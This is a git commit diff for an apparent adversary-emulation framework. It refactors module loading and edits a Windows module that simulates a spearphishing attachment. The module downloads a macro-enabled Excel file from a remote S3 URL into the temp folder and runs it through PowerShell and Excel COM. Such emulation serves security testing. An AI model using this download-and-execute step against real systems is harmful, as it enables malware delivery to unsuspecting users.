f2609705b3b835ce6e2a5a66c1d705ffe27e5618
opabravo <21262207+opabravo@users.noreply.github.com>
2023-03-08 18:11:55 +0800

    Make execution module able to load execution instance from json

--- core/module/base/BaseModule.py
+++ core/module/base/BaseModule.py
@@ -1,23 +1,47 @@
+import json
+from core.model.execution import Execution
+from dacite import from_dict
+from pathlib import Path
+
 class BaseModule:
     """
-    base class for all modules
+    Base class for all modules
     """
-    def __init__(self):
+
+    def __init__(self, execution_id: str):
         """
         Name: Module Name
         Description: Module Description
         OS : Windows, Linux, Mac, Android, iOS
         Platform: Powershell, Python
-        Elevation Requirement: Admin, User
-        Execution Timeout: 5 minute
-        Tactics: Initial Access, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact
-        Technique: ATT&CK Technique
+        Elevation Requirement: True, False
+        Execution Timeout: N minutes
+        Tactics: ID of MITRE ATT&CK Tactics
+        Technique: ID of MITRE ATT&CK Technique
         """
-        self.name = ""
-        self.description = ""
-        self.os = ""
-        self.platform = ""
-        self.elevation_requirement = ""
-        self.execution_timeout = 0
-        self.tactics = []
-        self.technique = []
+        self.execution_id = execution_id
+        execution_dict = self.get_execution(execution_id)
+        self.execution = from_dict(data_class=Execution, data=execution_dict)
+
+    def get_execution(self, execution_id: str) -> dict:
+        """
+        Get Execution dict from executions json file by id
+        """
+        execution_file = Path(__file__).parent.parent.parent / 'assets/executions.json'
+        with open(execution_file, 'r', encoding='utf-8') as f:
+            execution_data = json.load(f)
+        execution = next((e for e in execution_data['data'] if e['_id'] == execution_id), None)
+        return execution
+
+    def run(self):
+        """
+        The following code is used to run the scenario.
+        """
+        pass
+
+    def cleanup(self):
+        """
+        The following code is used to clean up after the scenario or restore a state that was changed.
+        """
+        pass
+
--- core/module/windows/D.py
+++ core/module/windows/D.py
@@ -1,5 +1,6 @@
 from core.module.base.BaseModule import BaseModule
 from core.dependency.windows.checker import microsoft_office_installed, file_exist
+from core.dependency.windows.installer import download
 
 
 class DownloadAndExecutePhishingAttachment(BaseModule):
@@ -16,10 +17,10 @@ class DownloadAndExecutePhishingAttachment(BaseModule):
         T1566.001 - Spearphishing Attachment
         T1137.001 - Office Template Macros
     """
+
     def __init__(self):
-        super().__init__()
-        self.download_file_url = "https://cym-rt-resources.s3-eu-west-1.amazonaws.com/PhishingAttachment.xlsm"
-        self.download_file_path = "$env:temp\PhishingAttachment.xlsm"
+        _id = "62385f03a0e69ed2274622cc"
+        super().__init__(execution_id=_id)
 
     def run(self):
         powershell_script = """$excel = New-Object -comobject Excel.Application
@@ -55,6 +56,20 @@ Remove-Item $env:temp\PhishingAttachment.xlsm -Force"""
     def is_success(self):
         """Checks if a chrome.exe process was created under an EXCEL.EXE process (macro)"""
 
+    def install_dependencies(self):
+        """Install dependencies and check before running"""
+        # Check if Microsoft Office is installed
+        ## Preempt Installation
+        ## Check
+        test1 = microsoft_office_installed()
+        if not test1:
+            print(f"Failed the check:\n{test1.__doc__}\n")
+        # The file must be present on your drive
+        ## Preempt Installation
+        result = download(self.execution.download_file_url, self.execution.download_file_path)
+        # if not test2:
+        #     print(f"Failed the check:\n{test2.__doc__}\n)
+
     def check_dependencies(self):
         """Check dependency before running"""
         test1 = microsoft_office_installed()
@@ -64,5 +79,6 @@ Remove-Item $env:temp\PhishingAttachment.xlsm -Force"""
         if not test2:
             print(f"Failed the check:\n{test2.__doc__}\n")
 
-
-
+    def output_parser(self, output):
+        """Parse the final output of the module"""
+        pass
